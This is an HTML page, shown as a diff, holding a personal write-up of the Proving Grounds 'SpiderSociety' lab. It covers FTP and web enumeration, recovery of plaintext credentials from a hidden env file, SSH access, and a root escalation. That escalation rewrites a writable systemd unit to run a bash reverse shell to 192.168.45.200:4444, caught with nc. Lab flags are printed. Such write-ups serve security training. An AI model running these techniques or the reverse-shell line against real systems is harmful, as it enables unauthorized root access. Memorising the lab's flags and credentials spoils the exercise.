@@ -1,0 +1,231 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This hands-on lab immerses learners in a realistic network environment where seemingly secure systems hide critical misconfigurations. Participants will start by enumerating exposed services and identifying weak points in the infrastructure. Using techniques such as service exploitation and credential abuse, learners will gain initial access, escalate privileges, and pivot across the network to access restricted systems. The lab emphasizes core penetration testing skills including enumeration, privilege escalation, and lateral movement—mirroring real-world attack scenarios."><title>Proving Grounds: SpiderSociety</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: SpiderSociety</h1><p>This hands-on lab immerses learners in a realistic network environment where seemingly secure systems hide critical misconfigurations. Participants will start by enumerating exposed services and identifying weak points in the infrastructure. Using techniques such as service exploitation and credential abuse, learners will gain initial access, escalate privileges, and pivot across the network to access restricted systems. The lab emphasizes core penetration testing skills including enumeration, privilege escalation, and lateral movement—mirroring real-world attack scenarios.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#overview">Overview</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#after-completing-this-lab-learners-will-be-able-to">After completing this lab, learners will be able to:</a></li><li><a href="#scenario">Scenario</a></li><li><a href="#objectives">Objectives</a></li><li><a href="#summary">Summary</a></li><li><a href="#objectives-2">Objectives</a></li><li><a href="#after-completing-this-lab-learners-will-be-able-to-2">After completing this lab, learners will be able to:</a></li><li><a href="#essentials">Essentials</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>This lab challenges learners to uncover and exploit misconfigurations within a seemingly secure network environment. By identifying exposed internal services and leveraging weak credentials, learners gain initial access before pivoting through the system to escalate privileges. The scenario emphasizes enumeration, abuse of common tools, and lateral movement, testing real-world penetration skills in a layered, realistic setup.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<h2 id="after-completing-this-lab-learners-will-be-able-to">After completing this lab, learners will be able to:</h2>
+<ul>
+<li>Enumerate open services and identify potential attack vectors.</li>
+<li>Exploit misconfigured services to gain initial access to the system.</li>
+<li>Escalate privileges by identifying sensitive files and credentials.</li>
+<li>Pivot through the environment to access restricted areas.</li>
+<li>Capture the root flag by exploiting system-level weaknesses.</li>
+</ul>
+<h2 id="scenario">Scenario</h2>
+<p>This hands-on lab immerses learners in a realistic network environment where seemingly secure systems hide critical misconfigurations. Participants will start by enumerating exposed services and identifying weak points in the infrastructure. Using techniques such as service exploitation and credential abuse, learners will gain initial access, escalate privileges, and pivot across the network to access restricted systems. The lab emphasizes core penetration testing skills including enumeration, privilege escalation, and lateral movement—mirroring real-world attack scenarios.</p>
+<p>This lab is ideal for aspiring penetration testers, red teamers, and cybersecurity professionals aiming to sharpen their offensive security skills. Participants will gain practical experience in uncovering service misconfigurations, exploiting internal tools, and navigating complex environments—essential capabilities for anyone preparing for certifications or active roles in offensive security.</p>
+<h2 id="objectives">Objectives</h2>
+<h2 id="summary">Summary</h2>
+<p>This lab challenges learners to uncover and exploit misconfigurations within a seemingly secure network environment. By identifying exposed internal services and leveraging weak credentials, learners gain initial access before pivoting through the system to escalate privileges. The scenario emphasizes enumeration, abuse of common tools, and lateral movement, testing real-world penetration skills in a layered, realistic setup.</p>
+<h2 id="objectives-2">Objectives</h2>
+<p>This hands-on lab immerses learners in a realistic network environment where seemingly secure systems hide critical misconfigurations. Participants will start by enumerating exposed services and identifying weak points in the infrastructure. Using techniques such as service exploitation and credential abuse, learners will gain initial access, escalate privileges, and pivot across the network to access restricted systems. The lab emphasizes core penetration testing skills including enumeration, privilege escalation, and lateral movement—mirroring real-world attack scenarios.</p>
+<p>This lab is ideal for aspiring penetration testers, red teamers, and cybersecurity professionals aiming to sharpen their offensive security skills. Participants will gain practical experience in uncovering service misconfigurations, exploiting internal tools, and navigating complex environments—essential capabilities for anyone preparing for certifications or active roles in offensive security.</p>
+<h2 id="after-completing-this-lab-learners-will-be-able-to-2">After completing this lab, learners will be able to:</h2>
+<ul>
+<li>Enumerate open services and identify potential attack vectors.</li>
+<li>Exploit misconfigured services to gain initial access to the system.</li>
+<li>Escalate privileges by identifying sensitive files and credentials.</li>
+<li>Pivot through the environment to access restricted areas.</li>
+<li>Capture the root flag by exploiting system-level weaknesses.</li>
+</ul>
+<h2 id="essentials">Essentials</h2>
+<ul>
+<li>Software versions * Kali 2022.3</li>
+<li>Nmap 7.92</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||47040|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            1391 Apr 14  2025 404.html
+drwxr-xr-x    2 0        0            4096 Apr 14  2025 images
+-rwxr-xr-x    1 0        0            4317 Apr 14  2025 index.html
+drwxr-xr-x    2 0        0            4096 Apr 14  2025 libspider
+-rwxr-xr-x    1 0        0            1345 Apr 14  2025 simple.py
+226 Directory send OK.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+ftp&gt; cd libspider
+250 Directory successfully changed.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||44825|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            5436 Apr 14  2025 control-panel.php
+-rwxr-xr-x    1 0        0            1389 Apr 14  2025 fetch-credentials.php
+-rwxr-xr-x    1 0        0            3752 Apr 14  2025 index.php
+-rwxr-xr-x    1 0        0             713 Apr 14  2025 login.php
+-rwxr-xr-x    1 0        0              88 Apr 14  2025 logout.php
+-rwxr-xr-x    1 0        0              51 Apr 14  2025 users.php
+226 Directory send OK.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+ftp&gt; ls -al
+229 Entering Extended Passive Mode (|||41499|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Apr 14  2025 .
+drwxr-xr-x    4 1002     1002         4096 Apr 14  2025 ..
+-r--------    1 33       33            170 Apr 14  2025 .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
+-rwxr-xr-x    1 0        0            5436 Apr 14  2025 control-panel.php
+-rwxr-xr-x    1 0        0            1389 Apr 14  2025 fetch-credentials.php
+-rwxr-xr-x    1 0        0            3752 Apr 14  2025 index.php
+-rwxr-xr-x    1 0        0             713 Apr 14  2025 login.php
+-rwxr-xr-x    1 0        0              88 Apr 14  2025 logout.php
+-rwxr-xr-x    1 0        0              51 Apr 14  2025 users.php
+226 Directory send OK.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/spidersociety]
+# Retrieve and inspect the web response from the target.
+
+└─$ curl http://offsec.lab/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
+FTP_BACKUP_USER=ss_ftpbckuser
+FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!
+
+DB_CONNECT_USER=spidey
+DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+spidey@spidersociety:~$ id
+uid=1001(spidey) gid=1001(spidey) groups=1001(spidey)</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Search the filesystem for files relevant to escalation or access.
+
+spidey@spidersociety:~$ find / -type f -iname &quot;spiderbackup.service&quot; 2&gt;/dev/null
+/etc/systemd/system/spiderbackup.service</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Inspect the directory for files relevant to the next step.
+
+spidey@spidersociety:~$ ls -al /etc/systemd/system/spiderbackup.service
+-rw-rw-r-- 1 spidey spidey 193 Apr 14  2025 /etc/systemd/system/spiderbackup.service</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Read the file contents for useful configuration or credential data.
+
+spidey@spidersociety:~$ cat /etc/systemd/system/spiderbackup.service
+[Unit]
+Description=Spider Society Backup Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/spiderbackup.sh
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Inspect the directory for files relevant to the next step.
+
+spidey@spidersociety:~$ ls -al /usr/local/bin/spiderbackup.sh
+-rwxr-xr-x 1 root root 66 Apr 14  2025 /usr/local/bin/spiderbackup.sh
+spidey@spidersociety:~$</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Read the file contents for useful configuration or credential data.
+
+spidey@spidersociety:~$ cat /usr/local/bin/spiderbackup.sh
+#!/bin/bash
+zip -r /backup/spidersociety_backup.zip /var/www/html</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
+|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: Spider Society
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+2121/tcp open  ftp     vsftpd 3.0.5
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel</code></pre><ul>
+<li><p>On port 80 we have a simple website</p>
+</li>
+<li><p>Adding both <code>offsec.lab</code> and <code>spidersociety.offsec.lab</code> to the /etc/hosts file</p>
+</li>
+<li><p>Running the dirbuster on both using different directories, i found <code>/libspider</code> path</p>
+</li>
+<li><p>going to that we found a login page and <code>admin:admin</code> logs us in</p>
+</li>
+<li><p>Clicking onto the communication, we get this username and password <code>ss_ftpbckuser:ss_WeLoveSpiderSociety_From_Tech_Dept5937!</code></p>
+</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>─(kali㉿kali)-[~/offsec/spidersociety]
+# Inspect the FTP service and retrieve accessible lab files.
+
+└─$ ftp 192.168.110.214 2121                                                                        
+Connected to 192.168.110.214.
+220 (vsFTPd 3.0.5)
+Name (192.168.110.214:kali): ss_ftpbckuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; prompt
+Interactive mode off.</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(.myenv)─(kali㉿kali)-[~/offsec/spidersociety]
+# Use the recovered credentials to establish a remote session.
+
+└─$ ssh spidey@192.168.110.214</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Identify commands that can run with elevated privileges.
+
+spidey@spidersociety:~$ sudo -l
+Matching Defaults entries for spidey on spidersociety:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User spidey may run the following commands on spidersociety:
+    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
+    (ALL) NOPASSWD: /bin/systemctl daemon-reload
+    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
+spidey@spidersociety:~$</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+spidey@spidersociety:~$ vim /etc/systemd/system/spiderbackup.service
+# Execute the next evidence-gathering step in the authorized lab.
+
+spidey@spidersociety:~$ sudo /bin/systemctl daemon-reload
+# Execute the next evidence-gathering step in the authorized lab.
+
+spidey@spidersociety:~$ sudo /bin/systemctl restart spiderbackup.service
+# Read the file contents for useful configuration or credential data.
+
+spidey@spidersociety:~$ cat /etc/systemd/system/spiderbackup.service
+[Unit]
+Description=Spider Society Backup Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.45.200/4444 0&gt;&amp;1&#39;
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
+spidey@spidersociety:~$</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code>──(kali㉿kali)-[~/offsec/spidersociety]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.200] from (UNKNOWN) [192.168.110.214] 39172
+bash: cannot set terminal process group (3972): Inappropriate ioctl for device
+bash: no job control in this shell
+root@spidersociety:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@spidersociety:/# cat /root/proof.txt
+# Read the file contents for useful configuration or credential data.
+
+cat /root/proof.txt
+b7bbeebb4398ab622c2c49d4974600ad
+root@spidersociety:/# cat /home/spidey/local.txt
+# Read the file contents for useful configuration or credential data.
+
+cat /home/spidey/local.txt
+bec655a15476c89d81dc47786a1d2cd8
+root@spidersociety:/#</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
